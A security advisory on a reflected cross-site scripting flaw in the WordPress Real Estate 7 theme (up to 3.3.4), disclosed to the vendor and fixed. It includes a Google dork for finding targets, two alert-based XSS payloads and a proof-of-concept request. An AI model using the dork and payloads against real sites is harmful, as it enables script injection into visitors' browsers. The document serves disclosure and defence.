---
title: WordPress Real Estate 7 Theme < = 3.3.4 - Unauthenticated Reflected Cross-Site Scripting (XSS)
url: https://cxsecurity.com/issue/WLB-2023030007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-06
fetch_date: 2025-10-04T08:45:09.118397
---

# WordPress Real Estate 7 Theme < = 3.3.4 - Unauthenticated Reflected Cross-Site Scripting (XSS)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Real Estate 7 Theme <= 3.3.4 - Unauthenticated Reflected Cross-Site Scripting (XSS)** **2023.03.05**  **![ru](https://cert.cx/cxstatic/images/flags/ru.png) [FearZzZz](https://cxsecurity.com/author/FearZzZz/1/) **(RU)** ![ru](https://cert.cx/cxstatic/images/flags/ru.png)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")**  **[**Dork:** inurl:/wp-content/themes/realestate-7/](https://cxsecurity.com/dorks/)** | |

==== [ Z://USB-00\_RESEARCH/WORDPRESS/ ] ============================================= [ 2023 ] ==
Report Title: WordPress Real Estate 7 Theme <= 3.3.4 - Unauthenticated Reflected Cross-Site Scripting (XSS)
Google Dork: inurl:/wp-content/themes/realestate-7/
Research Date: 2023-02-10
Researcher: FearZzZz [ https://fearzzzz.ru ]
Component Vendor: Contempo Themes [ https://contempothemes.com ]
Vulnerable Version: <= 3.3.4
Component Link: https://themeforest.net/item/wp-pro-real-estate-7-responsive-real-estate-wordpress-theme/12473778
CVSS Base Score: 6.1 (Medium)
CVSS Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
OWASP Top 10: A7: Cross-Site Scripting (XSS)
CWE: CWE-79
CVE: TBA
=================================================================================================
#### [ Description: ]
The Real Estate 7 premium theme for WordPress is vulnerable to Reflected Cross-Site Scripting (XSS) attack vector in versions up to, and including, v3.3.4 via the 'ct\_additional\_features' option due to insufficient input sanitization and output escaping. This vulnerability allows unauthenticated attackers to inject malicious JavaScript payload in the search page that execute if they can trick a user into performing an action such as clicking on a link.
#### [ Impact: ]
Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.
#### [ Payloads: ]
```
<img src=x onerror=(alert)(`FearZzZz`);>
```
```
<svg/onload=alert(`FearZzZz`)>
```
#### [ Proof-of-Concept: ]
https://elementor3.contempothemes.com/?ct\_mobile\_keyword&ct\_keyword=Z&ct\_zipcode&search-listings=true&ct\_additional\_features%5B0%5D=central-forced-air%3Csvg%2Fonload%3Dalert%28%60FearZzZz%60%29%3E
GET /?ct\_mobile\_keyword&ct\_keyword=Z&ct\_zipcode&search-listings=true&ct\_additional\_features%5B0%5D=central-forced-air%3Csvg%2Fonload%3Dalert%28%60FearZzZz%60%29%3E HTTP/2
Host: elementor3.contempothemes.com
#### [ Timeline: ]
2023.02.08 - Real Estate 7 Theme v3.3.4 released.
2023.02.10 - Vulnerability has been discovered.
2023.02.13 - Vendor notified, received a quick response.
2023.02.13 - Real Estate 7 Theme v3.3.5 released, the vulnerability has been fixed.
#### [ Contacts: ]
Website: fearzzzz.ru
Email: fearzzzz@tutanota.com
Twitter: https://twitter.com/fear\_zzzz
Medium: https://fearzzzz.medium.com
GitHub: https://github.com/fearzzzz
YouTube: https://youtube.com/@fearzzzz
#### [ Notes: ]
Special thanks to Chris Robinson (Contempo Themes Founder & CEO) for the quick response and for the respectful communication.
#### [ Disclaimer: ]
The information provided in this report is provided "as is" without warranty of any kind. FearZzZz disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall FearZzZz be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if FearZzZz have been advised of the possibility of such damages.
========================================================================== [ www.fearzzzz.ru ] ==

**##### References:**

https://raw.githubusercontent.com/fearzzzz/fearzzzz.github.io/main/vulnerability/%5B2023-02-10%5D-%5BWordPress%5D-Real-Estate-7-Premium-Theme-v3.3.4-Unauthenticated-Reflected-XSS.txt

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030007)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top